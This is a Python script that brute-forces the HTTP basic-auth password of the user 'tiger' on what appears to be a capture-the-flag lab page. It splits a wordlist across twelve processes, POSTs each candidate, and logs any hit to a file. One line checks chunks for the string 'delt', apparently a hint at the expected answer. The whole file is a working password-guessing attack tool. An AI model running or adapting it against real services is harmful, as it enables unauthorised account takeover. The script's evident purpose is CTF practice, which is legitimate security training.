#!/usr/bin/python3 -tt

import multiprocessing
import os, sys
import requests
import timeit
import signal

start = timeit.default_timer()
URL = "http://192.168.74.96/ctf/ws1/49/index.php"
USERNAME = "tiger"
PROXY = {'http':'http://127.0.0.1:8888'}
CORES = 12
f = open(sys.argv[1], "r")

def stop():
    stop = timeit.default_timer()
    print('Time: ', stop - start)
    f.close()
    sys.exit(1)
    
def main():
    tasks = []
    pool = multiprocessing.Pool(CORES)
    try:
        for a in range(0, CORES):
            wordlist = getpasswordcontent()
            task = pool.apply_async(brutepassword,(wordlist,a,))
            tasks.append(task)
            
        for job in tasks:
            if len(job.get()) > 0:
                pool.terminate()
                pool.close()
                pool.join()
                stop()
        pool.join()
        pool.close()
        print("time to cal main ")
        
        main()
        
    except Exception as details:
         print(details)
         pool.close()
         pool.join()
         stop()
        
def getseekCounter(filesize):
    return 30000
    #return int(filesize/os.cpu_count())

def getpasswordcontent():
    F_SIZE = os.fstat(f.fileno()).st_size
    print("File Size",F_SIZE)
    SEEK_COUNTER = getseekCounter(F_SIZE)
    print("Using Seek Counter",SEEK_COUNTER)
    print("File size Remaning",f.tell())
    if F_SIZE == f.tell():
        print("Password not in dict")
        stop()
    else:
        return f.read(SEEK_COUNTER).splitlines()

def brutepassword(wordlist,workerNo):
    print('parent process:', os.getppid())
    print('process id:', os.getpid())
    if 'delt' in wordlist:
        print("Password seems to be present in workerNo. ",workerNo)
    for key, password in enumerate(wordlist):
        r = requests.post(URL, auth=(USERNAME, password))#, proxies=PROXY)
        if r.status_code == 200:
            print("Password Found")
            print(password)
            open("passwordf.txt","a+").write(password)
            return password
    return ''
    
if __name__ == '__main__' :
    if len(sys.argv) == 2:
        main()
    else:
        print("Please Pass Word list file path")


